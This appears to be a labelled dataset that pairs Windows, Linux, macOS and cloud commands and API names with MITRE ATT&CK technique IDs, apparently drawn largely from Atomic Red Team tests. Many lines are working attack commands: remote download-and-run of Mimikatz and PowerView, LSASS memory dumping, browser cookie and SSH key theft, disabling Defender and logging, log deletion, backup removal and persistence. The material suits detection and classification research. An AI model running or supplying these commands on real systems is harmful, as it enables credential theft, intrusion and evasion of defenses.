"New-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"" -Name ""atomic_test"" -Force",T1547
FindNextFile,T1083
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs,T1027
system account set,T1531
LoadLibrayA,T1055
user.,T1564
echo $ENCODED > $encoded_file && b64decode -r < $encoded_file,T1140
MpCmdRun,T1562
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f,T1053
.gif,T1036
"echo ""Encrypted ZIP created. Extracting with password...""",T1027
cmd /c '$potato_path' -l '$listening_port' -t * -p '$target_exe' -c '$target_CLSID',T1134
Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100,T1040
"Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\$srserver_exe""",T1219
"echo ""WantedBy=default.target"" >> $systemd_service_path/$systemd_service_file",T1543
"Add-Content -Path $ads_file -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'",T1059
az ad user list,T1087
"Write-Output ""File downloaded: $($tmpFunctionCode)""",T1528
type {PATH_SMB} > {PATH_ABSOLUTE},T1105
reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY /d 72656463616e617279 /f,T1112
"$sheet.Cells.Item(2,1) = ""procexp.exe""",T1204
localectl status,T1614
at 13:20 /interactive cmd,T1053
rm -rf /var/log/messages,T1070
Start-Sleep 5,T1059
Morerecon -noninteractive -consoleoutput,T1082
cmstp.exe /nf,T1218
ShellExecute,T1106
IFileOperation,T1564
MicrosoftInternetExplorerCrashRepoeterTaskMachineUA,T1036
HKCU\Software\Classes\http\shell\open\command,T1012
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""",T1555
PassRole,T1548
/c cd /d c:\windows\temp\ & copy \\<IP ADDRESS>\c$\windows\system32\devmgr.dll \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1 /y,T1070
/var/log/auth.log,T1070
uk_UA,T1614
HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics,T1547
unamestr=$(uname),T1003
recentservers.xml,T1005
WmdmPmSp,T1543
/var/log/utmp,T1070
.json,T1105
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{CMD}""} -r:http://target:5985",T1216
"Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue",T1134
GetAsyncKeyState,T1056
$Create.TargetPath = $Target,T1547
cdb.exe -pd -pn {process_name} .shell {CMD},T1127
"if ($domain.AuthenticationType -eq ""Federated"") {",T1484
"sudo lsmod | grep -i ""xen-vbd\|xen-vnif""",T1082
Invoke-Obfuscation,T1027
vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll},T1218
ZwQueueApcThread,T1106
echo $dash_encoded | b64decode -r | sh,T1140
cat $sh_history_filename | grep $sh_history_grep_args > $output_file,T1552
"Start-Service -Name ""$service_name""",T1543
/mem,T1003
powershell “Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -,T1018
useradd -g 0 -M -d /root -s /bin/bash $username,T1136
"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",T1078
Mozilla/5.0 (compatible; MSIE 7.0; Win32),T1071
HKCU\Office365DCOMCheck,T1027
"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",T1218
g_CiOptions,T1553
WinAPI,T1106
tail /var/log/messages,T1056
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""",T1546
~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm,T1547
Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory,T1574
"perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""",T1140
certutil -encode $executable %temp%\T1140_calc.txt,T1140
"unzip -P ""$zip_password"" -o /tmp/art_encrypted.zip -d /tmp/",T1027
SecurityHealthService.exe,T1574
"""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];"" | cmd /c $sqlite3_path ""$cookie_db"" | out-file -filepath ""$output_file""",T1539
C:&#92;Users&#92;(username)&#92;.ssh&#92;,T1552
cmd.exe /c “<command> > <%temp%>\AM<random>. tmp” 2>&1,T1059
"kubectl run $pod_name --image=$image_name --restart=Never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '$at_command' | at $time_spec && at -l""",T1053
FindFirstVolumeW(),T1083
"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily",T1053
aws logs create-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,T1562
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess {PATH:.ps1},T1216
Set-MailboxAuditBypassAssociation,T1562
echo 'art_test_start()' >> $rc_service_path/$rc_service_file,T1543
DuplicateTokenEx,T1134
-WindowStyle Hidden,T1564
"""netsh"" advfirewall firewall add rule name=""Terminal Server"" dir=in action=allow protocol=TCP localport=3389",T1562
DuplicateToken,T1134
"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"" /f",T1112
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,T1003
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"" /v Path /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f",T1546
sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist,T1562
"[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null",T1036
WoodySharpExecutor,T1105
Set-MpPreference -dbm $True,T1562
lsof,T1049
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.,T1218
(0xd0a1),T1036
makecab.exe $input_file $output_file,T1560
Software Update Check,T1036
"echo cmd /c echo ""Shell code execution.""> $file_name:$ads_filename",T1564
if (-Not (Test-Path -Path $folderPath)) {,T1105
"copy ""$dllfilename"" %systemroot%\system32\",T1543
then sed -i '$ a #art_test_1562_006_1' /etc/$auditd_config_file_name,T1562
get-ADPrincipalGroupMembership $user | select name,T1069
"Write-Host ""Download completed: $zipPath"" -ForegroundColor Green",T1562
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force",T1562
gcloud storage buckets delete gs://$bucket_name,T1485
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f",T1112
ieexec.exe {REMOTEURL:.exe},T1105
"echo ""*** Configuration recorder stopped ***""",T1562
"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",T1216
catch [system.net.webexception],T1619
"echo ""WantedBy=timers.target"" >> $path_to_systemd_timer",T1053
Start-Sleep -s 30,T1098
"New-Service -Name ""$service_name"" -BinaryPathName ""$binary_path""",T1543
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use,T1059
Xcsh,T1059
WSUSPROXY,T1070
EnumServicesStatusExW(),T1007
curl,T1048
"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""$encrypted_command""; key = ""$xor_key""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",T1140
su-bruteforce,T1110
pcalua.exe -a $process,T1202
(%COMMON_ STARTUP%\\eoffice.exe),T1547
"cmd.exe /c ""$env:temp\psexec.exe -accepteula \\$targethost cmd.exe /c echo ""--access-token""""",T1569
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose,T1558
"Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""",T1003
PubPrn.vbs,T1216
/sbin/auditd,T1562
vaultcmd.exe,T1555
PerfLogs,T1485
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""",T1135
"echo ""Keep in mind that the faster you will get in touch, the less damage we cause"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"appDir=""$(dirname $(dirname ""$currentDir""))""",T1083
TerminateProcess(),T1106
Invoke-DCOM,T1021
Set-Acl -Path $termsrvDll -AclObject $ACL,T1505
VirtualAllocEx,T1055
systemsetup,T1082
CreateProcess(),T1106
Create Subkey,T1574
cmd.exe /c %APPDATA%\notepad.exe /B,T1036
ZoomVideoApp.exe,T1036
C:\ProgramData\Initech\Initech.exe /run,T1547
icacls . /grant Everyone:F /T /C /Q,T1222
"$HOME/.../sh -c ""echo $test_message""",T1036
ekrn.exe,T1480
.\calc.exe.lnk,T1204
/tmp/1,T1074
GlobalMemoryStatusEx,T1680
"$PYTHON_EXE -c ""print('Triggering Hook via usercustomize.py...')""",T1546
$env:COR_PROFILER = '$clsid_guid',T1574
"Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",T1574
diantz /f {PATH:.ddf},T1036
‘autocheck autoche *’,T1112
icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t,T1546
"$DirectorySearcher.PropertiesToLoad.Add(""Name"")",T1018
"odbcconf.exe /S /A {REGSVR ""$dll_payload""}",T1218
"Invoke-WebRequest $domain -UserAgent ""Wget/1.9+cvs-stable (Red Hat modified)"" | out-null",T1071
WINVNC.exe,T1036
"rundll32.exe {DLLname, DLLfunction}",T1218
rwdsk,T1070
"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",T1218
"Write-Host ""[Error] Invalid Inputs""",T1046
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,T1218
%USERPROFILE%\Adobe\Driver\dwg\,T1036
"Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""",T1562
squirrel.exe --updateRollback={REMOTEURL},T1218
cat $Out_Filepath,T1555
"Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};",T1546
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},T1105
c8:27:cc:c2:37:5a,T1497
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f,T1112
NSXPCConnection API,T1559
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v GlobalFlag /t REG_DWORD /d 512",T1546
gcloud compute os-login ssh-keys add,T1098
$STANDARD_INFORMATION,T1070
bcdedit,T1490
net group domain admins /domain,T1069
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
%temp%\T1036.007_masquerading.ps1.exe,T1036
Start-Sleep -s 3,T1548
Rt1AdjustPrivilege,T1106
Start-Process $UltraVNC_Viewer_Path,T1219
"az storage file download --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --only-show-errors --dest $tmpFunctionCode",T1528
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f",T1112
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,T1555
$DomainUsers | Foreach-Object {,T1110
HKEY_CURRENT_USER\Console\WindowsUpdate,T1112
"powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('$mimurl'); Invoke-Mimikatz -DumpCreds""",T1059
echo 'load_rc_config ${name}' >> $rc_service_path/$rc_service_file,T1543
Set-PSReadLineOption -HistorySavePath {File Path},T1562
Security Settings\Advanced Audit Policy Configuration,T1562
HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls,T1218
MachineGUID,T1480
Set-Clipboard -Value '$command',T1202
GetUserDefaultUILanguage,T1614
OpenSCManagerW(),T1007
foreach($prop in $props),T1552
New-Item -Path $ChannelPath -Force,T1562
C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe,T1036
podman run,T1543
$wc.Dispose(),T1491
chmod 4777 [file],T1548
vim-cmd vmsvc/getallvms,T1564
osacompile -x -o xcode.app main.applescript,T1059
net localgroup administrators art-test /add,T1078
ProgramArguments,T1543
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$target -accepteula -s ""cmd.exe""",T1053
if ($test.Connected) {,T1016
"echo ""*** Log Group Deleted ***""",T1562
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",T1003
"$sheet.Cells.Item(14,1) = ""=FWRITELN(A5, `""oStream.Type = 1`"")""",T1204
"return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);",T1562
net.exe group /domain,T1069
Windows.Data.TimeZones.zh-PH.pri,T1036
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1012
chflags hidden /var/tmp/T1564.001_mac.txt,T1564
else,T1048
Get-Keystrokes,T1056
otherchecks -noninteractive -consoleoutput,T1082
”C:\Windows\system32\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe”,T1053
Dim runTime As String,T1137
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon,T1027
$User.Save(),T1136
kk_KZ,T1614
FileRecvWriteRand,T1027
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f",T1546
show processes,T1057
%APPDATA%/Google/Chrome,T1217
Scan-Dir $_,T1083
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic,T1547
"echo ""ExecStop=$execstop_action"" >> $systemd_service_path/$systemd_service_file",T1543
IEX (New-Object Net.WebClient).DownloadString('$remote_script'); Invoke-Mimikatz -DumpCreds,T1003
chattr -i $file_to_modify,T1222
"Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"" -Destination ""C:\Windows\System32""",T1003
SOFTWARE\Microsoft\.NETFramework\policy\v2.0,T1012
openssl genrsa -out $key_filename 4096,T1553
Get-AntiPhishRule,T1562
Start-Sleep -Second 4,T1083
"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local",T1037
mshta.exe {PATH:.hta},T1218
"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""$dll_path""",T1547
mkdir $output_folder,T1003
Dim taskName As String,T1137
Start-Sleep -Seconds 7,T1027
CoCreateGuid,T1106
chrome_elf.dll,T1036
sudo touch /tmp/password-auth.bk,T1056
LR02DPt22R,T1027
GetRegValue,T1012
/sbin/emond,T1546
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f",T1112
[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt,T1033
defaults,T1037
"echo ""dn: CN=Admin User,CN=Users,DC=$domain,DC=$top_level_domain\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@$domain.$top_level_domain\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=$domain,DC=$top_level_domain"" > tempadmin.ldif",T1136
HKEY_CURRENT_User\Environment\windir,T1574
w3esvc,T1543
.config/solana/id.json,T1555
OneDrive.exe,T1036
echo ' ${command} /tmp/art-test.marker' >> $rc_service_path/$rc_service_file,T1543
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},T1105
"""$psexec_path"" /accepteula \\$machine -c $mimikatz_path ""lsadump::lsa /inject /id:500"" ""exit""",T1055
"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",T1218
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*,T1003
catch {,T1098
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,T1564
_objc_getClass(),T1129
reg query HKCU /f password /t REG_SZ /s,T1552
CScript.exe AtomicTestT1105.js //E:JScript,T1105
shutdown /r /t 1,T1529
.doc,T1005
launchctl start,T1569
systemctl stop ufw,T1562
Clear-DnsClientCache,T1562
Software\Microsoft\Windows\CurrentVersion\Run,T1547
termsrv.dll,T1505
Connect-AzureAD -Credential $Credential > $null,T1098
getfattr --only-values,T1564
"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {",T1003
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1012
ntsd.exe -g {CMD},T1127
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1012
Snaffler -noninteractive -consoleoutput,T1552
SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},T1218
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\,T1552
tree /F >> $output_file,T1083
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) $optional_args",T1018
"[System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)",T1562
aws --no-sign-request s3 cp --recursive s3://$s3_bucket_name /tmp/$s3_bucket_name,T1530
Get-Service WinDefend #check the service state of Windows Defender,T1518
"mkdir -p ""$TEMPDIR""",T1546
SetContextThread,T1055
"echo ""* * * * * $command"" > $tmp_cron && crontab $tmp_cron",T1053
echo 'rcvar=art_test_enable' >> $rc_service_path/$rc_service_file,T1543
sitecustomize.py,T1546
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""",T1555
msrun.bat,T1059
"Write-Host "" [!] $username:${password} are valid credentials!`r`n""",T1110
"Start-Process ""WinWord""",T1137
Credential = $cred,T1114
avp.exe,T1057
time(),T1124
"netsh.exe add helper ""$helper_file""",T1546
com.apple.openssl.plist,T1036
doFilter,T1040
csi.exe {PATH:.cs},T1127
net group /domain,T1069
PermitRootLogin,T1098
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 1",T1562
echo 0> $log_path,T1070
attrib.exe +h $file_or_folder\T1222.001_attrib2.txt,T1222
ifconfig.me,T1016
PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON,T1562
FuncName,T1553
show users,T1033
"Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi""",T1550
c:\Windows\System32\wbadmin.exe delete catalog -quiet,T1490
"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",T1078
dscacheutil -q user,T1087
fltMC.exe unload SysmonDrv,T1562
wlanAPI.dll,T1016
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > $output_file,T1083
sc.exe,T1569
GetSystemInfo,T1082
HH.exe {PATH_ABSOLUTE:.exe},T1218
rsync,T1105
cmd /c tasklist,T1057
"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""$payload_path""",T1218
"code.exe tunnel --accept-server-license-terms --name ""tunnel-name""",T1219
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f",T1547
"Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green",T1003
Expected: $ExpectedOutput,T1218
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > $output_file,T1074
"} elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {",T1530
InvocationMethod = '$invocation_method',T1218
"echo ""Type=simple"" >> $path_to_systemd_service",T1053
setenforce 0,T1562
netstat -ano | findstr EST,T1049
ufw prepend deny from 1.2.3.4,T1562
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" $pid",T1055
"reg query ""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"" /v TimeZoneKeyName",T1124
sudo unlink $system_log_path,T1070
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f",T1546
"reg add ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /d ""C:\Windows\System32\calc.exe"" /f",T1548
DLLRegisterServer,T1218
./stratus warmup aws.defense-evasion.vpc-remove-flow-logs,T1562
foreach ($cmdlets in $malcmdlets) {,T1059
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServices""",T1012
Index,T1053
"echo ""Type=simple""",T1543
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\$new_key"" /t REG_SZ /v Command /d $new_executable /f",T1112
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,T1222
chcp,T1614
set | grep LANG,T1614
"Write-Host ""Extracting archive to $extractFolder (overwriting existing files)"" -ForegroundColor Cyan",T1562
aws iam create-group --group-name $username,T1098
Select-Object -First 1 -ExpandProperty Name,T1562
if (MatchesExtension $_) {,T1083
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program ""$hollow_binary_path"" -debug",T1055
systemctl enable $systemd_timer_name,T1053
taskkill,T1489
"net groups ""Exchange Organization Management"" /domain",T1069
"$ADSearch.Filter=""(l=$keyObjectGuid)""",T1552
net.exe users,T1087
find $search_path -name id_rsa 2>/dev/null -exec cp --parents {} $output_folder \;,T1552
cat $HISTFILE,T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f",T1112
Get-MailboxExportRequest,T1114
Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},T1127
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose,T1018
"echo ""[Install]"" >> $path_to_systemd_timer",T1053
"command, as well as",T1057
"Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
LogoutHook,T1037
"Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.DisplayName)""",T1098
cmd /c systeminfo,T1082
start fodhelper.exe,T1548
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f",T1546
api_dev_key = $apiKey,T1567
HTTP GET,T1071
go run main.go GoAWSConsoleSpray -a $aws_account_id -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt,T1110
sudo,T1548
"$which_python -c 'import requests;import os;url = ""$script_url"";malicious_command = ""$executor $payload_file_name $script_args"";session = requests.session();source = session.get(url).content;fd = open(""$payload_file_name"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'",T1059
"else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""7"" ];",T1562
"wmic /node:""$node"" service where (caption like ""%$service_search_string%"")",T1047
foreach($table in $tables) {,T1619
takeown.exe /F filepath,T1222
%temp%\SMB\,T1074
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002",T1543
SystemParametersInfoAPI,T1106
at.allow,T1053
grep -ri password $file_path,T1552
"echo ""\$ART=$ART""",T1059
"Write-Output ""Enumeration complete. Results written to: $out""",T1083
"if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;",T1069
EnumSystemLanguageGroupsA,T1106
"Start-Process ""$script_path""",T1059
"Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""",T1046
NetServerEnum,T1018
"reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg",T1546
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force",T1562
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:$remote_payload""",T1216
"cd ""$PathToAtomicsFolder/T1098.001/bin/""",T1098
ps aux >> $output_file,T1057
"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",T1564
regsvr32.exe,T1218
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,T1012
regsvr32.exe /s {PATH:.dll},T1218
dscl,T1564
"mavinject $mypid /INJECTRUNNING ""$dll_payload""",T1055
poweroff -r 3,T1529
KERNEL32,T1106
"open -a ""/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/",T1539
"Write-Host "" [!] ${user}:${password} are valid credentials!""",T1110
.config,T1574
unset HISTFILE,T1070
mmc C:\Users\foo\admintools.msc /a,T1218
"echo ""$at_command"" | at $time_spec",T1053
HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString,T1012
sfinda,T1083
query.exe user,T1218
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"" -Value ""$newvalue""",T1547
"copy ""$executable_binary"" ""\\?\C:\Windows \System32\mmc.exe""",T1548
key,T1140
DonutTest,T1055
net config workstation,T1016
CryptEncrypt,T1486
cat /etc/shells,T1059
RegOpenKeyW,T1106
libcurl,T1129
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},T1218
/var/cron/tabs/,T1053
VSLaunchBrowser.exe .exe {REMOTEURL:.exe},T1105
@rpath,T1574
"reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f",T1546
"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",T1082
chmod g+s,T1548
Bka.exe,T1057
%TEMP%/TS_FB56.tmp,T1074
chmod -R $numeric_mode $file_or_folder,T1222
windows\system32\,T1053
"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f",T1112
reg add,T1112
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler $infotech_storage_handler -TopicExtension $topic_extension -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
"rundll32.exe file.dll,#1",T1218
"dir ""c:\Documents and Settings"" >> %temp%\download",T1083
Invoke-PowerDump,T1003
vpcext,T1497
